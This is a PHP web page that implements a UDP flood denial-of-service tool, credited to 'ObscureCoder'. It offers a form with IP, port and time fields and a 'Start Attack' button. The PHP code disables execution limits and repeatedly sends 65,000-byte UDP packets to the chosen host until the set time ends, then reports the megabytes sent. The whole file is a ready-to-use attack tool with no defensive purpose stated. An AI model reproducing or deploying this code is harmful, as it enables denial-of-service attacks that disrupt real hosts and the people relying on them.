<html>
<body>
<center>
<font color="#fff">
<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic' rel='stylesheet' type='text/css'>
<style>
body {
	background-color: #000;
}

input.oc {
	padding: 8px;
	width: 230px;
	margin-top: 10px;
	background: #CFCFCF;
	border-radius: 2px;
	border: 0;
	transition: 0.6s;
}

input.ocb {
	padding: 8px;
	width: 230px;
	margin-top: 10px;
	border: 0;
	background: -moz-linear-gradient(top, rgba(9,199,247,1) 0%, rgba(84,181,242,1) 1%, rgba(0,117,234,1) 100%);
	border-radius: 5px;
	color: #fff;
	font-family: 'Open Sans';
}

input.ocb:focus {
	background: #0051FF;
}

input.oc:focus {
	background: #fff; 
	box-shadow:         0px 0px 3px rgba(0, 128, 255, 0.75);
}

.ct {
	width: 340px;
	background-color: #f2f2f2;
	height: 220px;
	margin: 35px auto;
	border-radius: 5px;
	box-shadow:         0px 0px 14px rgba(255, 255, 255, 0.45);
}

.logo {
	margin-top: 40px;
}

.done {
	background: -moz-linear-gradient(top, rgba(205,235,142,1) 0%, rgba(165,201,86,1) 100%);
	color: #228F26;
	width: 340px;
	height: 100px;
	font-family: 'Open Sans';
	border-radius: 5px;
	box-shadow: 0px 0px 5px rgba(150, 255, 155, 0.75);
	border: 1px solid #005703;
}

.someresult {
	display: none;
}
</style>
<?php
error_reporting(0);
if(isset($_GET['ip'])&&isset($_GET['port'])&&isset($_GET['time'])){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    
    $exec_time = $_GET['time'];
    
    $time = time();
    //print "Started: ".time('d-m-y h:i:s')."<br>";
    $max_time = $time+$exec_time;

    $host = $_GET['ip'];
    
    for($i=0;$i<65000;$i++){
            $out .= 'X';
    }
    while(1){
    $packets++;
            if(time() > $max_time){
                    break;
            }
            $rand = intval($_GET['port']);
            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
    }
    echo '<br /><div class="done"><br /><b>Attack Sent</b><br />'.round(($packets*65)/1024, 2).'MBs<br /></div>';
    echo '<div class="logo">
	<img src="http://i.imgur.com/xGlhoZh.png" />
</div>
<div class="ct">
	<br />
	<form action="?" method="GET">
		<input type="hidden" name="act" value="phptools">
		<input type="text" class="oc" name="ip" placeholder="IP" /><br />
		<input type="text" class="oc" name="port" placeholder="Port" /><br />
		<input type="text" class="oc" name="time" placeholder="Time" /><br />
		<input type="submit" class="ocb" id="submitbutton" value="Start Attack" />
	</form>
</div>';
}else{ echo '<div class="logo">
	<img src="http://i.imgur.com/xGlhoZh.png" />
</div>
<div class="ct">
	<br />
	<form action="?" method="GET">
		<input type="hidden" name="act" value="phptools">
		<input type="text" class="oc" name="ip" placeholder="IP" /><br />
		<input type="text" class="oc" name="port" placeholder="Port" /><br />
		<input type="text" class="oc" name="time" placeholder="Time" /><br />
		<input type="submit" class="ocb" id="submitbutton" value="Start Attack" />
	</form>
</div>';
}
?>
</center>

<span style="color: #000;font-size: 10px;">Coded by ObscureCoder</span>

</body>
</html>
